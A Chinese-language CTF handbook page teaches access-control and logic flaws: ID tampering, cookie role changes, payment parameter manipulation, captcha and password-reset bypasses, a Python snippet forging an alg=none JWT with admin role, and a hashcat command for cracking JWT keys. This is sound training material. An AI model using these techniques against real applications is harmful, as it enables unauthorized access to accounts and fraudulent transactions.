---
title: 越权与逻辑漏洞
order: 10
icon: mdi:shield-lock-open-outline
category:
  - CTF
  - 手册
  - Web
---

越权漏洞（Broken Access Control）是 OWASP Top 10 2021 排名第一的漏洞。逻辑漏洞则是程序业务逻辑设计上的缺陷，两者在 CTF 中经常结合出现。

## 越权漏洞

### 水平越权

同级别用户访问了其他用户的数据。

```
# 正常请求：查看自己的订单
GET /api/order?id=1001

# 越权：把 id 改成别人的
GET /api/order?id=1002
```

**测试方法**：
1. 用账号 A 登录，记录请求中的用户标识（id、uid、username）
2. 把标识改成账号 B 的，看是否能访问 B 的数据

### 垂直越权

低权限用户访问了高权限功能。

```
# 普通用户访问管理员接口
GET /admin/users
POST /admin/deleteUser?id=1

# 修改请求中的角色标识
Cookie: role=user → role=admin
```

**测试方法**：
1. 用管理员账号记录管理功能的请求
2. 换成普通用户的 Cookie/Token，重放这些请求

### 未授权访问

不登录直接访问需要认证的接口：

```
# 删除 Cookie 或 Authorization Header 后重放请求
GET /api/admin/config
# 不带任何认证信息
```

## 逻辑漏洞

### 支付逻辑绕过

```
# 修改价格参数
POST /checkout
price=0.01&quantity=1

# 修改数量为负数（退款变购买）
quantity=-1

# 并发请求（条件竞争）
# 同时发送多个请求，利用余额检查和扣款之间的时间差
```

### 验证码绕过

```
# 验证码不失效：重复使用同一个验证码
# 验证码可预测：分析生成规律
# 验证码前端验证：删除 JS 校验逻辑
# 万能验证码：尝试 0000、1234、888888
```

### 密码重置逻辑

```
# 重置链接 token 可预测（时间戳、用户 ID）
# 重置时不验证 token 归属（A 的 token 重置 B 的密码）
# 修改响应包中的状态码绕过验证
```

## JWT 漏洞

JWT（JSON Web Token）是常见的认证方式，格式：`header.payload.signature`

### 算法混淆（alg=none）

```python
import base64, json

# 构造 header：算法改为 none
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
# 构造 payload：把 role 改为 admin
payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).decode().rstrip('=')
# 签名为空
token = f"{header}.{payload}."
```

### HS256 弱密钥爆破

```bash
# 用 hashcat 爆破 JWT 密钥
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

## 课后练习

- [你没有权限——真的吗](http://172.16.173.140/training/11?challenge=47) — 普通用户看不到 flag，只有管理员能看，尝试绕过权限校验

## 练手资源

- CTFHub 越权技能树
- PortSwigger Web Security Academy（Access Control 模块）
